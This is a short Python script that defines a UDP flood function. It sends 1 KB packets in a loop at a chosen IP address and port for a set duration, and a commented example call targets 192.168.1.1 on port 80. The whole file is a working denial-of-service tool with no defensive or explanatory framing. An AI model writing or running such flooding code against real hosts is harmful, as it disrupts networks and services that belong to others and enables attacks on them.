import socket
import time
import threading

# Function to send UDP packets
def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * 1024  # 1 KB payload
    end_time = time.time() + duration

    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < end_time:
        sock.sendto(payload, (target_ip, target_port))
    print("UDP flood completed.")

# Example usage
# udp_flood("192.168.1.1", 80, 10)  # Target IP, Port, Duration
